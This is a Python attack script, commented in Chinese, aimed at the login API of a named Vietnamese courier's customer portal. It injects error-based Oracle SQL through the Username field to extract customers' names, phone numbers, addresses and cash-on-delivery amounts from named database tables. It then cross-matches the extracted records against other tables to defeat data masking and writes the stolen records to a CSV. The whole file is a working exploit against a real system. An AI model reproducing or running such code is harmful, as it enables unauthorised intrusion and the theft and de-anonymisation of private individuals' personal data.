#!/usr/bin/env python3
"""
提取10月10日的19条真实电话数据
分析它们的特征，看能否用来匹配其他脱敏数据
"""

import requests
import json
import time
import csv

class UnmaskedExtractor:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def extract_all_unmasked(self):
        """提取所有19条真实电话记录"""
        print("=" * 80)
        print("📥 提取10月10日的19条真实电话数据")
        print("=" * 80)
        
        date = '20251010'
        records = []
        
        for i in range(1, 20):
            print(f"\n提取第 {i}/19 条...")
            
            # 获取完整信息
            query = (
                f"SELECT MABC||'|'||NGUOINHAN||'|'||DIENTHOAINHAN||'|'||DIACHI||'|'||"
                f"DIENTHOAIGUI||'|'||SO_TIEN_THU_HO FROM "
                f"(SELECT * FROM EMS.E1E2_PH WHERE NGAY='{date}' "
                f"AND DIENTHOAINHAN NOT LIKE '%+%' "
                f"AND DIENTHOAINHAN NOT LIKE '%x%' "
                f"AND LENGTH(DIENTHOAINHAN)=10 "
                f"AND SUBSTR(DIENTHOAINHAN,1,1)='0') "
                f"WHERE ROWNUM<={i} AND ROWNUM>={i}"
            )
            
            result = self.extract_via_error(query)
            
            if result:
                parts = result.split('|')
                if len(parts) >= 6:
                    record = {
                        'MABC': parts[0],
                        '姓名': parts[1],
                        '收件电话': parts[2],
                        '地址': parts[3],
                        '发件电话': parts[4],
                        '代收金额': parts[5]
                    }
                    records.append(record)
                    
                    print(f"  ✅ MABC: {record['MABC']}")
                    print(f"     姓名: {record['姓名']}")
                    print(f"     收件电话: {record['收件电话']}")
                    print(f"     代收: {record['代收金额']} VND")
            
            time.sleep(2)
        
        return records
    
    def analyze_unmasked_characteristics(self, records):
        """分析这些真实数据的特征"""
        print("\n" + "=" * 80)
        print("📊 分析真实数据特征")
        print("=" * 80)
        
        if not records:
            print("没有数据")
            return
        
        print(f"\n总共: {len(records)} 条真实数据")
        
        # 统计MABC前缀
        mabc_prefixes = {}
        for r in records:
            prefix = r['MABC'][:3]
            mabc_prefixes[prefix] = mabc_prefixes.get(prefix, 0) + 1
        
        print(f"\nMABC前缀分布:")
        for prefix, count in sorted(mabc_prefixes.items()):
            print(f"  {prefix}xxx: {count} 条")
        
        # 统计代收金额
        cod_count = sum(1 for r in records if r['代收金额'] != '0')
        print(f"\n代收订单: {cod_count}/{len(records)}")
        
        # 统计电话前缀
        phone_prefixes = {}
        for r in records:
            prefix = r['收件电话'][:3] if len(r['收件电话']) >= 3 else ''
            if prefix:
                phone_prefixes[prefix] = phone_prefixes.get(prefix, 0) + 1
        
        print(f"\n电话前缀分布:")
        for prefix, count in sorted(phone_prefixes.items()):
            print(f"  {prefix}xxxxxxx: {count} 条")
    
    def try_match_with_other_tables(self, records):
        """尝试用这些真实数据匹配其他表"""
        print("\n" + "=" * 80)
        print("🔗 尝试用真实数据匹配其他表")
        print("=" * 80)
        
        date = '20251010'
        
        for i, record in enumerate(records[:5], 1):  # 只测试前5条
            print(f"\n{'='*80}")
            print(f"测试 {i}/5: MABC={record['MABC']}")
            print(f"{'='*80}")
            
            mabc = record['MABC']
            real_phone = record['收件电话']
            sender = record['发件电话']
            amount = record['代收金额']
            
            print(f"  真实电话: {real_phone}")
            
            # 在SHIPMENT表查找
            print(f"\n  查找SHIPMENT表...")
            query_ship = f"SELECT CODE||'|'||RECEIVER_PHONE FROM EMS.SHIPMENT WHERE CODE='{mabc}' AND CREATE_DATE='{date}' AND ROWNUM=1"
            ship_data = self.extract_via_error(query_ship)
            
            if ship_data:
                parts = ship_data.split('|')
                ship_phone = parts[1] if len(parts) > 1 else ''
                print(f"    SHIPMENT电话: {ship_phone}")
                
                # 对比后4位
                if real_phone and ship_phone:
                    real_last4 = real_phone[-4:]
                    ship_last4 = ship_phone[-4:] if len(ship_phone) >= 4 else ''
                    
                    if real_last4 == ship_last4:
                        print(f"    ✅ 后4位匹配！{real_last4}")
                        print(f"    🎯 可以用真实电话解密SHIPMENT！")
                    else:
                        print(f"    ❌ 后4位不匹配: {real_last4} vs {ship_last4}")
            
            time.sleep(2)
            
            # 在TEMP_DATA2_LOG查找
            print(f"\n  查找TEMP_DATA2_LOG表...")
            query_temp = f"SELECT DIENTHOAINHAN FROM EMS.E1E2_PH_TEMP_DATA2_LOG WHERE MABC='{mabc}' AND NGAY='{date}' AND ROWNUM=1"
            temp_phone = self.extract_via_error(query_temp)
            
            if temp_phone:
                print(f"    TEMP_LOG电话: {temp_phone}")
                
                # 对比后4位
                if real_phone and temp_phone:
                    real_last4 = real_phone[-4:]
                    temp_last4 = temp_phone[-4:] if len(temp_phone) >= 4 else ''
                    
                    if real_last4 == temp_last4:
                        print(f"    ✅ 后4位匹配！{real_last4}")
                        print(f"    🎯 可以用真实电话解密TEMP_LOG！")
                    else:
                        print(f"    ❌ 后4位不匹配: {real_last4} vs {temp_last4}")
            
            time.sleep(2)
    
    def save_to_csv(self, records):
        """保存到CSV"""
        if not records:
            return
        
        filename = f'/workspace/unmasked_19_records_20251010.csv'
        
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=records[0].keys())
            writer.writeheader()
            writer.writerows(records)
        
        print(f"\n✅ 已保存到: {filename}")
    
    def run_extraction(self):
        """执行提取"""
        print("=" * 80)
        print("🔍 提取并分析真实电话数据")
        print("=" * 80)
        
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接到目标")
            return
        print(f"✅ 连接成功\n")
        
        # 提取数据
        records = self.extract_all_unmasked()
        
        if records:
            print(f"\n{'='*80}")
            print(f"✅ 成功提取 {len(records)} 条真实数据")
            print(f"{'='*80}")
            
            # 分析特征
            self.analyze_unmasked_characteristics(records)
            
            # 尝试匹配
            self.try_match_with_other_tables(records)
            
            # 保存
            self.save_to_csv(records)
        else:
            print("\n❌ 未提取到数据")
        
        print("\n" + "=" * 80)
        print("🎉 完成！")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    extractor = UnmaskedExtractor(target_url)
    extractor.run_extraction()
